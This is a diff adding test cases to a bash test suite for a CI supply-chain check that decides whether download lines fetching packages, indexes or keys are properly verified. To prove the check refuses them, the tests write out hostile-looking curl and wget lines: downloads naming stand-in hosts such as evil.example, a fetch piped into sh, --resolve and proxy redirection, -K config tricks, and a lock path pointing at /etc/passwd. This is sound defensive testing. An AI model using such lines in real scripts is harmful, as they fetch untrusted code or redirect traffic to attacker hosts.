@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16, REQ-SUP-001-AC18
+# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16, REQ-SUP-001-AC18, REQ-SUP-001-AC19
 # The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
 # package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
 # repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
@@ -1227,6 +1227,389 @@ for r in rows:
     assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
     assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
     assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and r["ruling"].startswith("text, not a command: ") and len(r["ruling"]) > len("text, not a command: ") + 10, r
+PY
+
+# --- REQ-SUP-001-AC19: ruled INPUT FETCHES. A line that really downloads an input whose address comes from a lock or the registry (a package, an index,
+# a key) is listed in the BASE branch's unmeasured_input_fetch: the AC16 row {file, form, key, line, ruling[, count]} (same binding, same counting, same
+# whitespace and continuation refusal, same strict JSON) plus host (the literal host the line may name, or lock:<path> of a committed lock the URL comes
+# from), verifier {file, function | line} (the step that checks the bytes) and test {file, case} (the case proving that failing bytes are rejected before
+# use). The verifier and the test must be in the head; a host row's line names only https://<host>/ and no variable host; a lock row's line names no host. -----
+cat >"$work/if.py" <<'PY'
+import hashlib, json, pathlib, re, shutil, subprocess, sys
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+CASEN = "a package whose bytes fail verify_sha256 is removed before use"
+cmd, args = sys.argv[1], sys.argv[2:]
+if cmd == "repo":     # repo SRC OUT (base|head PATH TEXT|-)...: a copy of SRC, a commit with the base files, then a head commit ("-" deletes the file)
+    src, out, spec = args[0], args[1], args[2:]
+    shutil.rmtree(out, ignore_errors=True); shutil.copytree(src, out, symlinks=True)
+    g = lambda *a: subprocess.run(["git", "-C", out, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+    for part in ("base", "head"):
+        for i in range(0, len(spec), 3):
+            if spec[i] != part:
+                continue
+            p = pathlib.Path(out) / spec[i + 1]
+            if spec[i + 2] == "-":
+                p.unlink()
+            else:
+                p.parent.mkdir(parents=True, exist_ok=True); p.write_text(spec[i + 2])
+        g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", part)
+elif cmd == "row":    # row FILE LINE HOST [OVERRIDES-JSON]: the row for LINE's download segment (null in OVERRIDES deletes a field)
+    f, line, host = args[:3]
+    flat = " ".join(line.split()); seg = next((s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s)), None)
+    form = "a download" if seg is not None else "a gh release or extension download"   # the gh form hashes the WHOLE line (key == line)
+    row = {"file": f, "form": form, "key": H(seg if seg is not None else flat), "line": H(flat), "ruling": "an input fetch: verify_sha256 checks the bytes against the lock before use",
+           "host": host, "verifier": {"file": "bin/fetch.sh", "function": "verify_sha256"}, "test": {"file": "bin/fetch-test.sh", "case": CASEN}}
+    for k, v in (json.loads(args[3]) if len(args) > 3 else {}).items():
+        if v is None:
+            row.pop(k, None)
+        else:
+            row[k] = v
+    print(json.dumps(row))
+elif cmd == "file":   # file OUT MODE ROW...: an exceptions file with the rows in unmeasured_input_fetch (MODE: plain, or how to break or split it)
+    out, mode, rows = args[0], args[1], [json.loads(r) for r in args[2:]]
+    d, raw = {"exceptions": [], "unmeasured_text": [], "unmeasured_input_fetch": rows}, None
+    if mode == "both": d["unmeasured_text"] = [{k: rows[0][k] for k in ("file", "form", "key", "line", "ruling")}]
+    elif mode == "split": d["unmeasured_text"], d["unmeasured_input_fetch"] = [{k: rows[0][k] for k in ("file", "form", "key", "line", "ruling")}], rows[1:]
+    elif mode == "astext": d["unmeasured_text"], d["unmeasured_input_fetch"] = [{k: r[k] for k in ("file", "form", "key", "line", "ruling")} for r in rows], []
+    elif mode == "notlist": d["unmeasured_input_fetch"] = {"rows": rows}
+    elif mode == "notdict": d["unmeasured_input_fetch"] = [list(rows[0].values())]
+    elif mode == "dup": d["unmeasured_input_fetch"] = rows + rows[:1]
+    elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_input_fetch": [], "unmeasured_input_fetch": ' + json.dumps(rows) + '}'
+    elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_input_fetch": [' + json.dumps(rows[0])[:-1] + ', "host": "evil.example"}]}'
+    elif mode == "nanrow": raw = '{"exceptions": [], "unmeasured_input_fetch": [' + json.dumps(rows[0])[:-1] + ', "count": NaN}]}'
+    elif mode != "plain": raise SystemExit("unknown mode " + mode)
+    open(out, "w").write(raw if raw is not None else json.dumps(d, indent=2))
+else:
+    raise SystemExit("unknown command " + cmd)
+PY
+ifrepo() { local n=$1; shift; python3 "$work/if.py" repo "$base" "$work/$n" "$@"; }
+ifrow() { python3 "$work/if.py" row "$@"; }
+ifx() { python3 "$work/if.py" file "$@"; }
+ifck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/if.json" --exceptions "$2" >"$work/if.out" 2>&1 || rc=$?; }
+HOSTN=packages.example.dev; LOCKP=build/locks/pkgs.lock
+LIT='curl -fsSL "https://packages.example.dev/os/$arch/APKINDEX.tar.gz" -o "$tmp/APKINDEX.tar.gz"'
+LCK='curl -fsSL --retry 3 "$url" -o "$tmp/pkg.apk"'
+FETCH=$'#!/bin/sh\nset -eu\nverify_sha256() { echo "$2  $1" | sha256sum -c - >/dev/null || { rm -f "$1"; exit 1; }; }\n'
+LOCKT=$'pkg 1.0 https://packages.example.dev/os/x86_64/pkg-1.0.apk 0000000000000000000000000000000000000000000000000000000000000000\n'
+TESTT=$'#!/bin/sh\nCASE="a package whose bytes fail verify_sha256 is removed before use"\n'
+SUPPORT=(base bin/fetch.sh "$FETCH" base "$LOCKP" "$LOCKT" base bin/fetch-test.sh "$TESTT")
+ifrepo ifm "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LCK"$'\n'
+RLIT=$(ifrow bin/fetch.sh "$LIT" "$HOSTN"); RLCK=$(ifrow bin/fetch.sh "$LCK" "lock:$LOCKP")
+ifx "$work/if-ok.json" plain "$RLIT" "$RLCK"
+CASE="AC19 setup: the fixture adds exactly two unmeasured downloads (a literal-host index fetch and a lock-addressed package fetch), the scan stays strict"
+check python3 - "$chk" "$work/ifm" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
+assert len(a) == 2 and all(x[0] == "bin/fetch.sh" and x[1] == "a download" for x in a), a
+PY
+ifck ifm "$work/if-ok.json"
+CASE="AC19: a base-branch row for each added input fetch (host, verifier, test present in the head) passes: exit 0, each reported as a ruled input fetch naming its verifier"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2; check grep -q 'verify_sha256' "$work/if.out"
+check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled input fetch' in x['reason'] for x in r), r" "$work/if.json"
+ifx "$work/if-one.json" plain "$RLIT"; ifck ifm "$work/if-one.json"
+CASE="AC19: a row exempts exactly its own fetch: the other added download fails (exit 1), the ruled one is reported as ruled"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1
+ifx "$work/if-none.json" plain; ifck ifm "$work/if-none.json"
+CASE="AC19: an empty unmeasured_input_fetch exempts nothing: both added downloads fail (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 2
+for ov in '{"key": "0000000000000000"}' '{"line": "0000000000000000"}' '{"file": "bin/other.sh"}'; do
+  ifx "$work/if-w.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$ov")" "$RLCK"; ifck ifm "$work/if-w.json"
+  CASE="AC19: a row whose identity does not match ($ov) does not apply: that fetch fails (exit 1)"
+  check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1
+done
+ifrepo ifedit "${SUPPORT[@]}" head bin/fetch.sh "$FETCH${LIT/APKINDEX.tar.gz\"/APKINDEX.tar.gz?x=1\"}"$'\n'"$LCK"$'\n'
+ifck ifedit "$work/if-ok.json"
+CASE="AC19: editing a ruled fetch line voids its row (the whole-line hash changes): the edited fetch fails (exit 1), the other stays ruled"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+ifrepo ifpipe "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LCK"$'\n' head bin/fetch.sh "$FETCH$LCK | sh"$'\n'
+ifck ifpipe "$work/if-ok.json"
+CASE="AC19 (edited line is an addition): a ruled fetch rewritten to pipe into sh keeps its download segment but is an addition no row names: exit 1"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+ifrepo iftwice "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LIT"$'\n'
+ifx "$work/if-c1.json" plain "$RLIT"; ifck iftwice "$work/if-c1.json"
+CASE="AC19 (count): the same fetch line added twice with a row that counts one fails (exit 1)"
+check test "$rc" -eq 1
+ifx "$work/if-c2.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" '{"count": 2}')"; ifck iftwice "$work/if-c2.json"
+CASE="AC19 (count): count 2 on the fetch line added twice passes (exit 0)"
+check test "$rc" -eq 0
+ifrepo ifcont "${SUPPORT[@]}" head bin/fetch.sh "$FETCH"$'curl -fsSL \\\n"https://packages.example.dev/os/$arch/APKINDEX.tar.gz" -o "$tmp/APKINDEX.tar.gz"\n'
+ifck ifcont "$work/if-ok.json"
+CASE="AC19 (continuation): the ruled line joined from a backslash-newline continuation is never ruled, though it flattens to the ruled line: exit 1"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+ifrepo ifvt "${SUPPORT[@]}" head bin/fetch.sh "$FETCH${LIT/ -o/$'\v'-o}"$'\n'
+ifck ifvt "$work/if-ok.json"
+CASE="AC19 (odd whitespace): the ruled line with a vertical tab where a space was is never ruled: exit 1"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+# (5) base only: a row the pull request brings in its own exceptions file does nothing; the same rows in the trusted copy beside the script do
+ifrepo ifhead "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LCK"$'\n' head .github/supply-chain-exceptions.json "$(cat "$work/if-ok.json")"
+rc=0; python3 "$chk" --root "$work/ifhead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/if.out" 2>&1 || rc=$?
+CASE="AC19: input-fetch rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both fetches fail (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 2
+mkdir -p "$work/trusted-if/agent"; cp -R "$here/../supply-chain" "$work/trusted-if/agent/supply-chain"; cp "$work/if-ok.json" "$work/trusted-if/supply-chain-exceptions.json"; rc=0
+python3 "$work/trusted-if/agent/supply-chain/pin-age-check.py" --root "$work/ifhead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/if.out" 2>&1 || rc=$?
+CASE="AC19: the default rulings file is the trusted copy beside the script: the same input-fetch rows there pass (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2
+rm -rf "$work/trusted-if"
+# (6) one list per item: the same row in both lists is malformed; an item whose lines are ruled by different lists is not ruled; rows only in
+# unmeasured_text are AC16 rulings (text), never reported as input fetches
+ifx "$work/if-both.json" both "$RLIT" "$RLCK"; ifck ifm "$work/if-both.json"
+CASE="AC19 (one list per item): the same (file, form, key, line) in unmeasured_text AND unmeasured_input_fetch stops the check: exit 2, names both lists, not a pass"
+check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -q 'unmeasured_text' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
+LCKP="echo go | $LCK"
+ifrepo ifmix "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LCK"$'\n'"$LCKP"$'\n'
+ifx "$work/if-split.json" split "$(ifrow bin/fetch.sh "$LCKP" "lock:$LOCKP")" "$RLCK"; ifck ifmix "$work/if-split.json"
+CASE="AC19 (one list per item): one download whose two lines are ruled one by unmeasured_text and one by unmeasured_input_fetch is not ruled: exit 1"
+check test "$rc" -eq 1; check test "$(grep -cE 'ruled text|ruled input fetch' "$work/if.out")" -eq 0; check grep -q 'FAIL unmeasured:bin/fetch.sh: a download added' "$work/if.out"
+ifx "$work/if-mix2.json" plain "$(ifrow bin/fetch.sh "$LCKP" "lock:$LOCKP")" "$RLCK"; ifck ifmix "$work/if-mix2.json"
+CASE="AC19 (one list per item) control: both lines ruled by unmeasured_input_fetch pass (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+ifx "$work/if-astext.json" astext "$RLIT" "$RLCK"; ifck ifm "$work/if-astext.json"
+CASE="AC19 (one list per item): rows in unmeasured_text only are reported as ruled text (AC16), never as ruled input fetches"
+check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+# (2) a host row: the download segment names https://<host>/ and nothing that could send it elsewhere
+hostcase() { # LINE EXPECTED-RC WHY
+  ifrepo ifh "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$1"$'\n'
+  ifx "$work/if-h.json" plain "$(ifrow bin/fetch.sh "$1" "$HOSTN")"; ifck ifh "$work/if-h.json"
+  CASE="AC19 (host row): $3: exit $2"
+  check test "$rc" -eq "$2"
+  if [ "$2" -eq 0 ]; then check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; else check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; fi
+}
+hostcase "$LIT" 0 'control: the literal https://packages.example.dev/ with a variable path and output passes'
+hostcase 'if ! curl -fsSL --retry 3 --proto =https https://packages.example.dev/os/x86_64/APKINDEX.tar.gz -o "$tmp/i" 2>/dev/null; then exit 1; fi' 0 'control: if !, --retry N, --proto =https and a stderr redirect pass'
+hostcase 'wget -q -O "$tmp/k.pub" https://packages.example.dev/wolfi-signing.rsa.pub' 0 'control: wget -q -O FILE with the literal host passes'
+hostcase 'curl -fsSL "https://$HOST/os/x86_64/APKINDEX.tar.gz" -o "$tmp/i"' 1 'a variable host (https://$HOST/) is refused'
+hostcase 'curl -fsSL "https://${HOST}/os/x86_64/APKINDEX.tar.gz" -o "$tmp/i"' 1 'a variable host (https://${HOST}/) is refused'
+hostcase 'curl -fsSL "$URL" -o "$tmp/i"' 1 'a URL that is wholly a variable ($URL) is refused'
+hostcase 'curl -fsSL "$WOLFI/wolfi-signing.rsa.pub" -o "$tmp/k"' 1 'a host-and-prefix variable ($WOLFI/...) is refused'
+hostcase 'curl -fsSL "http://packages.example.dev/os/x86_64/APKINDEX.tar.gz" -o "$tmp/i"' 1 'plain http:// to the right host is refused'
+hostcase 'curl -fsSL "https://packages.example.dev.evil.example/os/i" -o "$tmp/i"' 1 'a host that only starts with the ruled host is refused'
+hostcase 'curl -fsSL "https://packages.example.dev@evil.example/os/i" -o "$tmp/i"' 1 'userinfo before another host (https://host@evil/) is refused'
+hostcase 'curl -fsSL "https://packages.example.dev:8443/os/i" -o "$tmp/i"' 1 'a port after the ruled host is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i" "$EVIL" -o "$tmp/i"' 1 'a second URL from a variable on the same command is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i" https://evil.example/x -o "$tmp/i"' 1 'a second literal URL to another host is refused'
+hostcase 'curl -fsSL --url "$EVIL" "https://packages.example.dev/os/i" -o "$tmp/i"' 1 '--url VALUE (an option this check does not know) is refused'
+hostcase 'curl -fsSL -K "$cfg" "https://packages.example.dev/os/i" -o "$tmp/i"' 1 '-K (a config file that can name any URL) is refused'
+hostcase 'curl -fsSLK "$cfg" "https://packages.example.dev/os/i" -o "$tmp/i"' 1 'K hidden in a short-option cluster is refused'
+hostcase 'curl -fsSL --resolve packages.example.dev:443:10.0.0.1 "https://packages.example.dev/os/i" -o "$tmp/i"' 1 '--resolve (sends the host elsewhere) is refused'
+hostcase 'curl -fsSL -x "$PROXY" "https://packages.example.dev/os/i" -o "$tmp/i"' 1 '-x (a proxy from a variable) is refused'
+hostcase 'https_proxy=$P curl -fsSL "https://packages.example.dev/os/i" -o "$tmp/i"' 1 'an environment assignment before the command is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/$(cat /tmp/p)" -o "$tmp/i"' 1 'a command substitution in the segment is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i" -o "$tmp/i" <"$cfg"' 1 'an input redirect is refused'
+hostcase 'wget -q -i "$list" -O "$tmp/i" https://packages.example.dev/os/i' 1 'wget -i (an input file of URLs) is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i -o "$tmp/i"' 1 'unbalanced quotes (the segment cannot be read as words) are refused'
+hostcase 'curl -fsSL "HTTPS://packages.example.dev/os/i" -o "$tmp/i"' 1 'an upper-case scheme is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i" -o "$tmp/i"; echo "https://evil.example/x"' 1 'another host elsewhere on the WHOLE line (another command) is refused'
+hostcase 'curl -fsSL --proto =all "https://packages.example.dev/os/i" -o "$tmp/i"' 1 '--proto other than =https is refused'
+hostcase 'curl -fsSL "https://packages.example.dev/os/i" -o "${d:-/tmp}/i"' 1 'an output path with an expansion other than $NAME is refused'
+LCKE='curl -fsSL "$url" -o "$tmp/pkg.apk"; echo "https://packages.example.dev/x"'
+ifrepo ifle "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LCKE"$'\n'
+ifx "$work/if-le.json" plain "$(ifrow bin/fetch.sh "$LCKE" "lock:$LOCKP")"; ifck ifle "$work/if-le.json"
+CASE="AC19 (lock row): a lock row whose WHOLE line names an address in another command is refused (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+lockcase() { # LINE EXPECTED-RC WHY: a lock row on LINE
+  ifrepo ifl "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$1"$'\n'
+  ifx "$work/if-l.json" plain "$(ifrow bin/fetch.sh "$1" "lock:$LOCKP")"; ifck ifl "$work/if-l.json"
+  CASE="AC19 (lock row): $3: exit $2"
+  check test "$rc" -eq "$2"
+  if [ "$2" -eq 0 ]; then check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; else check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; fi
+}
+lockcase "$LCK" 0 'control: one variable read from the lock, --retry N and an output file pass'
+lockcase 'curl -fsSL "$base/$file" -o "$tmp/pkg.apk"' 1 'an address built from variables (a host from a variable outside the lock) is refused'
+lockcase 'curl -fsSL "$url" "$evil" -o "$tmp/pkg.apk"' 1 'two addresses (a second variable) are refused: ONE variable read from the lock'
+lockcase 'curl -fsSLK "$cfg" "$url" -o "$tmp/pkg.apk"' 1 'K hidden in a short-option cluster (a config file that can name any URL) is refused'
+lockcase 'curl -fsSL -K "$cfg" "$url" -o "$tmp/pkg.apk"' 1 '-K VALUE is refused'
+ifx "$work/if-hw.json" plain "$(ifrow bin/fetch.sh "$LIT" other.example.dev)" "$RLCK"; ifck ifm "$work/if-hw.json"
+CASE="AC19 (host row): a host row naming another host than the line's does not apply: that fetch fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+ifx "$work/if-hl.json" plain "$RLIT" "$(ifrow bin/fetch.sh "$LCK" "$HOSTN")"; ifck ifm "$work/if-hl.json"
+CASE="AC19 (host row): a host row on the lock-addressed line (no literal host on it) does not apply: that fetch fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+# (3) a lock row: the lock is in the head tree, holds only https:// addresses, and the line itself names no host
+ifrepo ifnolock "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LCK"$'\n' head "$LOCKP" -
+ifck ifnolock "$work/if-ok.json"
+CASE="AC19 (lock row): the lock file missing from the head tree: the lock-addressed fetch fails (exit 1), the host row still passes"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+ifrepo ifhttplock "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LCK"$'\n' head "$LOCKP" "${LOCKT/https:/http:}"
+ifck ifhttplock "$work/if-ok.json"
+CASE="AC19 (lock row): a lock that holds an http:// address fails the lock-addressed fetch (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+ifx "$work/if-lw.json" plain "$RLIT" "$(ifrow bin/fetch.sh "$LCK" "lock:build/locks/other.lock")"; ifck ifm "$work/if-lw.json"
+CASE="AC19 (lock row): a lock row naming a lock that is not in the head tree fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+LCKH='curl -fsSL "$url" https://evil.example/x -o "$tmp/pkg.apk"'
+ifrepo iflh "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LCKH"$'\n'
+ifx "$work/if-lh.json" plain "$(ifrow bin/fetch.sh "$LCKH" "lock:$LOCKP")"; ifck iflh "$work/if-lh.json"
+CASE="AC19 (lock row): a lock row whose line also names a literal host is refused (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
+ifx "$work/if-lit-lock.json" plain "$(ifrow bin/fetch.sh "$LIT" "lock:$LOCKP")" "$RLCK"; ifck ifm "$work/if-lit-lock.json"
+CASE="AC19 (lock row): a lock row on the literal-host line (the line names a host) is refused (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
+# (4) the verifier and the test: in the head tree, holding the named function or line and the named case
+vtcase() { # OVERRIDES-JSON WHY [REPO]
+  ifx "$work/if-vt.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$1")" "$RLCK"; ifck "${3:-ifm}" "$work/if-vt.json"
+  CASE="AC19 (verifier/test): $2: that fetch fails (exit 1), named, the other stays ruled"
+  check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; check grep -qiE 'verif|test' "$work/if.out"
+}
+vtcase '{"verifier": {"file": "bin/missing.sh", "function": "verify_sha256"}}' 'a verifier file not in the head tree'
+vtcase '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sig"}}' 'a verifier function the file does not define'
+vtcase '{"verifier": {"file": "bin/fetch-test.sh", "function": "verify_sha256"}}' 'a file that only MENTIONS the function (no definition)'
+vtcase '{"verifier": {"file": "bin/fetch.sh", "line": "sha256sum -c - || exit 1"}}' 'a verifier line the file does not hold'
+vtcase '{"test": {"file": "bin/missing-test.sh", "case": "a package whose bytes fail verify_sha256 is removed before use"}}' 'a test file not in the head tree'
+vtcase '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes fail is used anyway"}}' 'a test case the test file does not hold'
+ifrepo iflink "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LCK"$'\n'
+lb=$(printf 'verify_sha256() { :; }' | git -C "$work/iflink" hash-object -w --stdin)   # a symbolic link in the TREE whose target text defines the function
+git -C "$work/iflink" update-index --add --cacheinfo "120000,$lb,bin/vlink.sh"; git -C "$work/iflink" commit -q --amend -m head
+vtcase '{"verifier": {"file": "bin/vlink.sh", "function": "verify_sha256"}}' 'a verifier that is a symbolic link in the tree' iflink
+ifx "$work/if-vl.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" '{"verifier": {"file": "bin/fetch.sh", "line": "verify_sha256() { echo \"$2  $1\" | sha256sum -c - >/dev/null || { rm -f \"$1\"; exit 1; }; }"}}')" "$RLCK"; ifck ifm "$work/if-vl.json"
+CASE="AC19 (verifier/test) control: a verifier named by its exact line passes (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2
+# a later pull request that removes the verifier or the test while the ruled fetch stays in the head fails, though it adds no download
+ifrepo ifgone "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head bin/fetch.sh $'#!/bin/sh\nset -eu\n'"$LIT"$'\n'
+ifck ifgone "$work/if-ok.json"
+CASE="AC19 (verifier/test): a pull request that removes the verifier of a ruled fetch still in the head fails (exit 1), naming the verifier"
+check test "$rc" -eq 1; check grep -q 'verify_sha256' "$work/if.out"
+ifrepo ifgonet "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head bin/fetch-test.sh $'#!/bin/sh\n'
+ifck ifgonet "$work/if-ok.json"
+CASE="AC19 (verifier/test): a pull request that removes the test case of a ruled fetch still in the head fails (exit 1)"
+check test "$rc" -eq 1
+ifrepo ifstay "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head README.md 'x'
+ifck ifstay "$work/if-ok.json"
+CASE="AC19 (verifier/test) control: a pull request that keeps the verifier and the test of a ruled fetch passes (exit 0)"
+check test "$rc" -eq 0
+# (1) a malformed unmeasured_input_fetch stops the check (exit 2), never "nothing ruled" and never "everything ruled"
+for ov in '{"host": null}' '{"verifier": null}' '{"test": null}' '{"ruling": ""}' '{"ruling": " "}' '{"key": "ABCDEF0123456789"}' '{"key": "0123"}' '{"line": 7}' \
+  '{"count": 0}' '{"count": 101}' '{"count": true}' '{"count": 2.0}' '{"note": "x"}' '{"form": "a system package install"}' '{"file": ""}' \
+  '{"host": ""}' '{"host": "Packages.Example.Dev"}' '{"host": "https://packages.example.dev"}' '{"host": "packages.example.dev/os"}' '{"host": "packages.example.dev:443"}' \
+  '{"host": "localhost"}' '{"host": "lock:"}' '{"host": "lock:/etc/passwd"}' '{"host": "lock:../x.lock"}' '{"host": "lock:a/./b.lock"}' '{"host": 5}' \
+  '{"verifier": "bin/fetch.sh"}' '{"verifier": {"file": "bin/fetch.sh"}}' '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sha256", "line": "x y z"}}' \
+  '{"verifier": {"file": "bin/fetch.sh", "function": "verify sha"}}' '{"verifier": {"file": "/bin/fetch.sh", "function": "verify_sha256"}}' \
+  '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sha256", "note": "x"}}' '{"verifier": {"file": "bin/fetch.sh", "line": ""}}' \
+  '{"verifier": {"file": "bin/fetch.sh", "line": "a\nb"}}' '{"verifier": {"file": "../fetch.sh", "function": "verify_sha256"}}' \
+  '{"test": "bin/fetch-test.sh"}' '{"test": {"file": "bin/fetch-test.sh"}}' '{"test": {"file": "bin/fetch-test.sh", "case": "short"}}' \
+  '{"test": {"file": "bin/fetch.sh", "case": "a package whose bytes fail verify_sha256 is removed before use"}}' \
+  '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes fail verify_sha256 is removed before use", "note": "x"}}' \
+  '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes\nfail verify_sha256"}}'; do
+  ifx "$work/if-bad.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$ov")" "$RLCK"; ifck ifm "$work/if-bad.json"
+  CASE="AC19: a malformed unmeasured_input_fetch row ($ov) stops the check fail-closed: exit 2, names the list, never a pass"
+  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
+done
+for m in notlist notdict dup dupjsonkey duprowkey nanrow; do
+  ifx "$work/if-bad.json" "$m" "$RLIT" "$RLCK"; ifck ifm "$work/if-bad.json"
+  CASE="AC19: a malformed unmeasured_input_fetch ($m) stops the check fail-closed: exit 2, names the list, never a pass"
+  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
+done
+CASE="AC19 (generic): no row without host, verifier and test is accepted: an AC16 row, and the AC19 row less any one field or sub-field, are each refused by the loader"
+check python3 - "$chk" "$work" "$RLIT" <<'PY'
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+good = json.loads(sys.argv[3]); p = sys.argv[2] + "/if-gen.json"
+def load(row):
+    json.dump({"exceptions": [], "unmeasured_input_fetch": [row]}, open(p, "w"))
+    return ac.load_input_fetch(p, required=True)
+assert len(load(good)) == 1
+variants = [{k: good[k] for k in ("file", "form", "key", "line", "ruling")}]
+variants += [{k: v for k, v in good.items() if k != drop} for drop in good]
+variants += [dict(good, **{f: {k: v for k, v in good[f].items() if k != drop}}) for f in ("verifier", "test") for drop in good[f]]
+for v in variants:
+    try:
+        load(v)
+    except RuntimeError as e:
+        assert "unmeasured_input_fetch" in str(e), e
+    else:
+        raise AssertionError(("accepted", v))
+PY
